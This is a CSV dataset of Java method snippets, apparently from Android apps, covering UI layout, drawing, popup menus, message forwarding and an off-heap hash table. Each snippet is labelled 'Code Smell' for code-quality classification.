text,label,text_label
"@Override public boolean remove(int x,int y,int z){
  long tableAddr=this.tableAddr;
  if (tableAddr == 0L) {
    return false;
  }
  long mask=this.tableSize - 1L;
  long flag=positionFlag(x,y,z);
  int searchBucketX=x >> BUCKET_AXIS_BITS;
  int searchBucketY=y >> BUCKET_AXIS_BITS;
  int searchBucketZ=z >> BUCKET_AXIS_BITS;
  long hash=hashPosition(searchBucketX,searchBucketY,searchBucketZ);
  for (long i=0L; ; i++) {
    long bucketAddr=tableAddr + ((hash + i) & mask) * BUCKET_BYTES;
    int bucketX=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET);
    int bucketY=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Y_OFFSET);
    int bucketZ=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Z_OFFSET);
    long value=PUnsafe.getLong(bucketAddr + BUCKET_VALUE_OFFSET);
    if (value == 0L) {
      return false;
    }
 else     if (bucketX != searchBucketX || bucketY != searchBucketY || bucketZ != searchBucketZ) {
      continue;
    }
 else     if ((value & flag) == 0L) {
      return false;
    }
    this.size--;
    if ((value & ~flag) == 0L) {
      this.usedBuckets--;
      this.shiftBuckets(tableAddr,(hash + i) & mask,mask);
    }
 else {
      PUnsafe.putLong(bucketAddr + BUCKET_VALUE_OFFSET,value & ~flag);
    }
    return true;
  }
}
@Override public boolean remove(@NonNull int... point){
  checkArg(point.length == 3);
  return this.remove(point[0],point[1],point[2]);
}",1,Code Smell
"@Override public int pointToPosition(int x,int y){
  if (mColumnWidth + mHorizontalSpacing <= 0 || mRowHeight + mVerticalSpacing == 0) {
    return INVALID_POSITION;
  }
  int m=(x - mFirstLeft) / (mColumnWidth + mHorizontalSpacing);
  int n=(y - mFirstTop) / (mRowHeight + mVerticalSpacing);
  int right=mFirstLeft + (m + 1) * (mColumnWidth + mHorizontalSpacing);
  int bottom=mFirstTop + (n + 1) * (mRowHeight + mVerticalSpacing) + mRowHeight;
  if (x > right || y > bottom || m >= mColumnsNum) {
    return INVALID_POSITION;
  }
 else {
    int result=n * mColumnsNum + m + mFirstVisibleFirstItem;
    result=result <= getLastVisiblePosition() ? result : INVALID_POSITION;
    return result;
  }
}",1,Code Smell
"public void setSharedElementEnterTransition(Activity activity,String sharedElementName){
  setSharedElementEnterTransition(activity,sharedElementName,DEFAULT_TIMEOUT);
}
public void setSharedElementEnterTransition(Activity activity,String sharedElementName,long timeoutMs){
  if ((activity == null && !TextUtils.isEmpty(sharedElementName)) || (activity != null && TextUtils.isEmpty(sharedElementName))) {
    throw new IllegalArgumentException();
  }
  if (activity == mActivityToRunTransition && TextUtils.equals(sharedElementName,mSharedElementName)) {
    return;
  }
  mActivityToRunTransition=activity;
  mSharedElementName=sharedElementName;
  if (DEBUG) {
    Log.d(TAG,""postponeEnterTransition "" + mActivityToRunTransition);
  }
  Object transition=TransitionHelper.getSharedElementEnterTransition(activity.getWindow());
  setAutoStartSharedElementTransition(transition != null);
  ActivityCompat.postponeEnterTransition(mActivityToRunTransition);
  if (timeoutMs > 0) {
    new Handler().postDelayed(new TransitionTimeOutRunnable(this),timeoutMs);
  }
}",1,Code Smell
"private int scrollOffsetForQuote(MessageObject object){
  if (TextUtils.isEmpty(highlightMessageQuote) || object == null) {
    if (dummyMessageCell != null) {
      dummyMessageCell.computedGroupCaptionY=0;
      dummyMessageCell.computedCaptionLayout=null;
    }
    return 0;
  }
  int offsetY;
  CharSequence text;
  ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks;
  if (!TextUtils.isEmpty(object.caption) && dummyMessageCell != null && dummyMessageCell.captionLayout != null) {
    offsetY=(int)dummyMessageCell.captionY;
    text=object.caption;
    textLayoutBlocks=dummyMessageCell.captionLayout.textLayoutBlocks;
  }
 else {
    offsetY=0;
    text=object.messageText;
    textLayoutBlocks=object.textLayoutBlocks;
    if (dummyMessageCell != null && dummyMessageCell.linkPreviewAbove) {
      offsetY+=dummyMessageCell.linkPreviewHeight + dp(10);
    }
  }
  if (dummyMessageCell != null) {
    dummyMessageCell.computedGroupCaptionY=0;
    dummyMessageCell.computedCaptionLayout=null;
  }
  if (textLayoutBlocks == null || text == null) {
    return 0;
  }
  int index=MessageObject.findQuoteStart(text.toString(),highlightMessageQuote,highlightMessageQuoteOffset);
  if (index < 0) {
    return 0;
  }
  for (int i=0; i < textLayoutBlocks.size(); ++i) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(i);
    StaticLayout layout=block.textLayout;
    String layoutText=layout.getText().toString();
    if (index > block.charactersOffset) {
      final float y;
      if (index - block.charactersOffset > layoutText.length() - 1) {
        y=offsetY + (int)(block.textYOffset + block.padTop + block.height);
      }
 else {
        y=offsetY + block.textYOffset + block.padTop+ layout.getLineTop(layout.getLineForOffset(index - block.charactersOffset));
      }
      if (y > AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f)) {
        return (int)(y - AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f));
      }
      return 0;
    }
  }
  return 0;
}",1,Code Smell
"@Override public void onPropsSet(){
  super.onPropsSet();
  if (isTornDown()) {
    return;
  }
  final Node node=getNodeJni();
  if (mViroContext == null || mScene == null || mScene.getNativeScene() == null || node == null) {
    return;
  }
  if (mImage == null || !mImage.hasKey(""source"")) {
    onError(""Viro: Missing required Image for a Viro Particle Emitter!"");
    return;
  }
  downloadImageIfNeeded();
  if (mLatestTexture == null) {
    return;
  }
  setImageOnParticle();
  if (mNativeEmitter == null) {
    mNativeEmitter=new ParticleEmitter(mViroContext,mNativeQuad);
    node.setParticleEmitter(mNativeEmitter);
  }
  updateSpawnModifier();
  updateAppearanceModifier();
  updatePhysicsModifier();
  updateEmitterState();
  if (mEmitterNeedsRestart) {
    mNativeEmitter.resetEmissionCycle();
    mEmitterNeedsRestart=false;
  }
}
",1,Code Smell
"public void updateForward(ArrayList<MessageObject> forwardMessages,long dialogId){
  hasCaption=false;
  hasSenders=false;
  isSecret=DialogObject.isEncryptedDialog(dialogId);
  multipleUsers=false;
  if (forwardMessages != null) {
    ArrayList<String> hiddenSendersName=new ArrayList<>();
    for (int i=0; i < forwardMessages.size(); ++i) {
      MessageObject messageObject=forwardMessages.get(i);
      if (!TextUtils.isEmpty(messageObject.caption)) {
        hasCaption=true;
      }
      if (!isSecret) {
        if (messageObject.messageOwner.fwd_from != null) {
          TLRPC.MessageFwdHeader header=messageObject.messageOwner.fwd_from;
          if (header.from_id == null && !hiddenSendersName.contains(header.from_name)) {
            hiddenSendersName.add(header.from_name);
          }
        }
      }
    }
    this.forwardMessages=new Messages(true,0,forwardMessages,dialogId,this.forwardMessages != null ? this.forwardMessages.selectedIds : null);
    if (this.forwardMessages.messages.isEmpty()) {
      this.forwardMessages=null;
    }
    ArrayList<Long> uids=new ArrayList<>();
    for (int a=0; a < forwardMessages.size(); a++) {
      MessageObject object=forwardMessages.get(a);
      long uid;
      if (object.isFromUser()) {
        uid=object.messageOwner.from_id.user_id;
      }
 else {
        TLRPC.Chat chat=MessagesController.getInstance(object.currentAccount).getChat(object.messageOwner.peer_id.channel_id);
        if (ChatObject.isChannel(chat) && chat.megagroup && object.isForwardedChannelPost()) {
          uid=-object.messageOwner.fwd_from.from_id.channel_id;
        }
 else {
          uid=-object.messageOwner.peer_id.channel_id;
        }
      }
      if (!uids.contains(uid)) {
        uids.add(uid);
      }
    }
    if (uids.size() + hiddenSendersName.size() > 1) {
      multipleUsers=true;
    }
  }
 else {
    this.forwardMessages=null;
  }
}",1,Code Smell
"private void updateStoriesPosting(){
  final boolean storiesEnabled=getMessagesController().storiesEnabled();
  if (this.storiesEnabled != storiesEnabled) {
    if (floatingButton2Container != null) {
      floatingButton2Container.setVisibility(onlySelect && initialDialogsType != 10 || folderId != 0 || !storiesEnabled || (searchItem != null && searchItem.isSearchFieldVisible()) || isInPreviewMode() ? View.GONE : View.VISIBLE);
    }
    updateFloatingButtonOffset();
    if (!this.storiesEnabled && storiesEnabled && storyHint != null) {
      storyHint.show();
    }
    this.storiesEnabled=storiesEnabled;
  }
  if (floatingButton == null || floatingButtonContainer == null) {
    return;
  }
  if (initialDialogsType == DIALOGS_TYPE_WIDGET) {
    floatingButton.setImageResource(R.drawable.floating_check);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""Done"",R.string.Done));
  }
 else   if (storiesEnabled) {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon_camera,56,56);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""AccDescrCaptureStory"",R.string.AccDescrCaptureStory));
  }
 else {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon,52,52);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""NewMessageTitle"",R.string.NewMessageTitle));
  }
}",1,Code Smell
"public CustomPopupMenu(Context context,Theme.ResourcesProvider resourcesProvider,boolean containsSwipeBack){
  popupLayout=new ActionBarPopupWindow.ActionBarPopupWindowLayout(context,R.drawable.popup_fixed_alert2,resourcesProvider,containsSwipeBack ? ActionBarPopupWindow.ActionBarPopupWindowLayout.FLAG_USE_SWIPEBACK : 0);
  popupLayout.setAnimationEnabled(false);
  popupLayout.setOnTouchListener((v,event) -> {
    if (event.getActionMasked() == MotionEvent.ACTION_UP) {
      if (popupWindow != null && popupWindow.isShowing()) {
        v.getHitRect(AndroidUtilities.rectTmp2);
        if (!AndroidUtilities.rectTmp2.contains((int)event.getX(),(int)event.getY())) {
          popupWindow.dismiss();
        }
      }
    }
    return false;
  }
);
  popupLayout.setDispatchKeyEventListener(keyEvent -> {
    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_BACK && keyEvent.getRepeatCount() == 0 && popupWindow != null && popupWindow.isShowing()) {
      popupWindow.dismiss();
    }
  }
);
  popupLayout.setShownFromBottom(false);
  onCreate(popupLayout);
  popupWindow=new ActionBarPopupWindow(popupLayout,LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT);
  popupWindow.setAnimationEnabled(false);
  popupWindow.setAnimationStyle(R.style.PopupContextAnimation2);
  popupWindow.setOutsideTouchable(true);
  popupWindow.setClippingEnabled(true);
  popupWindow.setInputMethodMode(ActionBarPopupWindow.INPUT_METHOD_NOT_NEEDED);
  popupWindow.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED);
  popupWindow.getContentView().setFocusableInTouchMode(true);
  popupWindow.setOnDismissListener(() -> {
    onDismissed();
    isShowing=false;
  }
);
}",1,Code Smell
"/** 
 * Replace hide operations with visibility changes on the exiting views. Instead of making the entire fragment's view GONE, make each exiting view INVISIBLE. At the end of the transition, make the fragment's view GONE.
 */
private static void replaceHide(FragmentTransitionImpl impl,Object exitTransition,Fragment exitingFragment,final ArrayList<View> exitingViews){
  if (exitingFragment != null && exitTransition != null && exitingFragment.mAdded && exitingFragment.mHidden && exitingFragment.mHiddenChanged) {
    exitingFragment.setHideReplaced(true);
    impl.scheduleHideFragmentView(exitTransition,exitingFragment.getView(),exitingViews);
    final ViewGroup container=exitingFragment.mContainer;
    OneShotPreDrawListener.add(container,new Runnable(){
      @Override public void run(){
        setViewVisibility(exitingViews,View.INVISIBLE);
      }
    }
);
  }
}
",1,Code Smell
"private void openCaptionEnter(){
  if (imageMoveAnimation != null || changeModeAnimation != null || currentEditMode != EDIT_MODE_NONE || sendPhotoType == SELECT_TYPE_AVATAR || sendPhotoType == SELECT_TYPE_WALLPAPER || sendPhotoType == SELECT_TYPE_QR) {
    return;
  }
  if (!windowView.isFocusable()) {
    makeFocusable();
  }
  keyboardAnimationEnabled=true;
  selectedPhotosListView.setEnabled(false);
  photosCounterView.setRotationX(0.0f);
  isPhotosListViewVisible=false;
  if (captionEditText.getMessageEditText() != null) {
    captionEditText.getMessageEditText().invalidateEffects();
    captionEditText.getMessageEditText().setText(captionEditText.getMessageEditText().getText());
  }
  captionEditText.setTag(1);
  captionEditText.openKeyboard();
  captionEditText.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_AUTO);
  lastTitle=actionBar.getTitle();
  captionEditText.setVisibility(View.VISIBLE);
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (itemsEnterAnimator != null) {
    itemsEnterAnimator.dispatchDraw();
  }
  if (drawSelectorBehind && !selectorRect.isEmpty()) {
    selectorDrawable.setBounds(selectorRect);
    canvas.save();
    if (selectorTransformer != null) {
      selectorTransformer.accept(canvas);
    }
    selectorDrawable.draw(canvas);
    canvas.restore();
  }
  super.dispatchDraw(canvas);
  if (!drawSelectorBehind && !selectorRect.isEmpty()) {
    selectorDrawable.setBounds(selectorRect);
    canvas.save();
    if (selectorTransformer != null) {
      selectorTransformer.accept(canvas);
    }
    selectorDrawable.draw(canvas);
    canvas.restore();
  }
  if (overlayContainer != null) {
    overlayContainer.draw(canvas);
  }
  if (sectionsType == SECTIONS_TYPE_STICKY_HEADERS) {
    if (sectionsAdapter != null && !headers.isEmpty()) {
      for (int a=0; a < headers.size(); a++) {
        View header=headers.get(a);
        int saveCount=canvas.save();
        int top=(Integer)header.getTag();
        canvas.translate(LocaleController.isRTL ? getWidth() - header.getWidth() : 0,top);
        canvas.clipRect(0,0,getWidth(),header.getMeasuredHeight());
        header.draw(canvas);
        canvas.restoreToCount(saveCount);
      }
    }
  }
 else   if (sectionsType == SECTIONS_TYPE_DATE) {
    if (sectionsAdapter != null && pinnedHeader != null && pinnedHeader.getAlpha() != 0) {
      int saveCount=canvas.save();
      int top=(Integer)pinnedHeader.getTag();
      canvas.translate(LocaleController.isRTL ? getWidth() - pinnedHeader.getWidth() : 0,top);
      if (pinnedHeaderShadowDrawable != null) {
        pinnedHeaderShadowDrawable.setBounds(0,pinnedHeader.getMeasuredHeight(),getWidth(),pinnedHeader.getMeasuredHeight() + pinnedHeaderShadowDrawable.getIntrinsicHeight());
        pinnedHeaderShadowDrawable.setAlpha((int)(255 * pinnedHeaderShadowAlpha));
        pinnedHeaderShadowDrawable.draw(canvas);
        long newTime=SystemClock.elapsedRealtime();
        long dt=Math.min(20,newTime - lastAlphaAnimationTime);
        lastAlphaAnimationTime=newTime;
        if (pinnedHeaderShadowAlpha < pinnedHeaderShadowTargetAlpha) {
          pinnedHeaderShadowAlpha+=dt / 180.0f;
          if (pinnedHeaderShadowAlpha > pinnedHeaderShadowTargetAlpha) {
            pinnedHeaderShadowAlpha=pinnedHeaderShadowTargetAlpha;
          }
          invalidate();
        }
 else         if (pinnedHeaderShadowAlpha > pinnedHeaderShadowTargetAlpha) {
          pinnedHeaderShadowAlpha-=dt / 180.0f;
          if (pinnedHeaderShadowAlpha < pinnedHeaderShadowTargetAlpha) {
            pinnedHeaderShadowAlpha=pinnedHeaderShadowTargetAlpha;
          }
          invalidate();
        }
      }
      canvas.clipRect(0,0,getWidth(),pinnedHeader.getMeasuredHeight());
      pinnedHeader.draw(canvas);
      canvas.restoreToCount(saveCount);
    }
  }
}",1,Code Smell
